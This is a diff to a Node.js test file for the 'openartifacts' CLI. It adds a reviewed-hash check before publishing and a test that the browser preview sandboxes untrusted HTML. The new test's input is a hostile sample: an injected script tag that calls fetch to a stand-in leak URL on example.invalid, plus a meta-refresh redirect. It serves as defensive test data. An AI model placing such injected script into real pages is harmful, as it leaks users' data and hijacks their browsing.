@@ -5,6 +5,8 @@ import { once } from "node:events";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import test from "node:test";
+import { createHash } from "node:crypto";
+import { createBrowserPreview } from "../src/preview.js";
 import { collectToken, configDir, detectAgents, installSkills, main, npmProcess, presentError, renderFile } from "../src/cli.js";
 import { APIError } from "../src/client.js";
 
@@ -66,12 +68,12 @@ test("installer fetches latest and copies its newly installed skill", async () =
   const installedRoot = join(globalRoot, "openartifacts");
   const calls = join(directory, "npm-calls.jsonl");
   await mkdir(bin, { recursive: true });
-  await mkdir(join(installedRoot, "skill", "openartifacts"), { recursive: true });
+  await mkdir(join(installedRoot, "skill", "v1"), { recursive: true });
   await writeFile(join(installedRoot, "package.json"), JSON.stringify({
     name: "openartifacts",
     version: "0.2.0",
   }));
-  await writeFile(join(installedRoot, "skill", "openartifacts", "SKILL.md"), "latest skill\n");
+  await writeFile(join(installedRoot, "skill", "v1", "SKILL.md"), "latest skill\n");
   const fakeNpm = join(bin, "npm");
   await writeFile(fakeNpm, `#!${process.execPath}\nconst { appendFileSync } = require("node:fs");\nconst args = process.argv.slice(2);\nappendFileSync(${JSON.stringify(calls)}, JSON.stringify(args) + "\\n");\nif (args[0] === "root") console.log(${JSON.stringify(globalRoot)});\n`);
   await chmod(fakeNpm, 0o755);
@@ -172,9 +174,9 @@ test("preview is unauthenticated, leaves config untouched, and matches create an
   try {
     // Resolving the alias must use the same title and content as publishing it.
     const rendered = await preview(alias);
-    assert.match(rendered, /<title>notes<\/title>/);
-    assert.match(rendered, /<h1>Heading<\/h1>[\s\S]*<strong>world<\/strong>/);
-    assert.equal(await preview(html), htmlSource);
+    const uploadHtml = await renderFile(markdown);
+    assert.equal(rendered, createBrowserPreview(uploadHtml));
+    assert.equal(await preview(html), createBrowserPreview(htmlSource));
     assert.equal(requests.length, 0);
     await assert.rejects(readdir(config), { code: "ENOENT" });
 
@@ -189,11 +191,16 @@ test("preview is unauthenticated, leaves config untouched, and matches create an
     assert.equal(requests.length, 0);
 
     process.env.OPENARTIFACTS_TOKEN = "test-token";
-    await main(["publish", alias]);
+    const hash = createHash("sha256").update(uploadHtml).digest("hex");
+    await writeFile(markdown, "Changed after review");
+    await assert.rejects(main(["publish", alias, "--reviewed-sha256", hash]), /changed after review/);
+    assert.equal(requests.length, 0);
+    await writeFile(markdown, "# Heading\n\nHello **world**.");
+    await main(["publish", alias, "--reviewed-sha256", hash]);
     await main(["publish", markdown]);
     await main(["publish", html]);
     assert.deepEqual(requests.map((request) => request.method), ["POST", "PUT", "POST"]);
-    assert.deepEqual(requests.map((request) => JSON.parse(request.body).html), [rendered, rendered, htmlSource]);
+    assert.deepEqual(requests.map((request) => JSON.parse(request.body).html), [uploadHtml, uploadHtml, htmlSource]);
     const state = JSON.parse(await readFile(join(config, "state.json"), "utf8"));
     assert.deepEqual(Object.keys(state.files).sort(), [
       `https://preview-test.invalid\n${await realpath(markdown)}`,
@@ -406,4 +413,18 @@ test("a stale publish mapping requires explicit replacement", async () => {
     remote.server.close();
   }
   assert.deepEqual(remote.methods, ["POST", "PUT", "DELETE", "POST"]);
+});
+
+
+test("protected preview keeps hostile source out of the trusted shell", () => {
+  const source = '<script>fetch("https://example.invalid/leak")</script><meta http-equiv="refresh" content="0;url=https://example.invalid"><p>Note</p>';
+  const preview = createBrowserPreview(source);
+  assert.equal((preview.match(/<script>/g) ?? []).length, 1);
+  assert.equal((preview.match(/<\/script>/g) ?? []).length, 1);
+  assert.match(preview, /sandbox="allow-same-origin"/);
+  assert.doesNotMatch(preview, /sandbox="allow-scripts"/);
+  assert.match(preview, /script-src 'none'/);
+  assert.match(preview, /connect-src 'none'/);
+  assert.match(preview, /frame-src 'none'/);
+  assert.ok(!preview.includes(source));
 });
